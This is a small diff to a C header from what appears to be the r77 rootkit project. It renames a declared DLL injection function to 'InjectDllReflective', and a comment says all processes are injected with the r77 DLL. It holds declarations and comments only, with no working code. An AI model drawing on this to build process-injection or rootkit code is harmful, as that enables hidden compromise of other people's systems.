@@ -37,7 +37,7 @@ typedef struct _R77_PROCESS
 /// otherwise, FALSE.
 /// If the timeout was exceeded, this function returns FALSE.
 /// </returns>
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout);
+BOOL InjectDllReflective(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout);
 /// <summary>
 /// Injects all processes with the r77 DLL.
 /// </summary>
